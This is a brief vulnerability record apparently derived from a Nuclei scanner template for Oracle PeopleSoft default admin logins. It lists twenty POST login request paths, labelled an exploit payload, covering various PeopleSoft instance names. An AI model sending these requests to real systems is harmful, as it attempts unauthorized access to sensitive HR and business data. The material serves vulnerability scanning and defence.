# Vulnerability: Oracle PeopleSoft - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`peoplesoft-default-login.yaml`)

## Description
Oracle PeopleSoft contains a default admin login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
POST {{BaseURL}}/psc/ps/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/csperf/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/FMPRD/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/csprd/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/hcmprdfp/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/HRPRODASP/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/guest/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/CSPRD_PUB/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/LHCGWPRD_1/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/CCHIPRD_2/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/applyuth/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/HRPRD/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/CAREERS/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/heprod_5/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/saprod/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/hr857prd_er/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/CHUMPRDM/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/HR92PRD/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/cangate_1/?&cmd=login&languageCd=ENG
POST {{BaseURL}}/psp/ihprd/?&cmd=login&languageCd=ENG
```

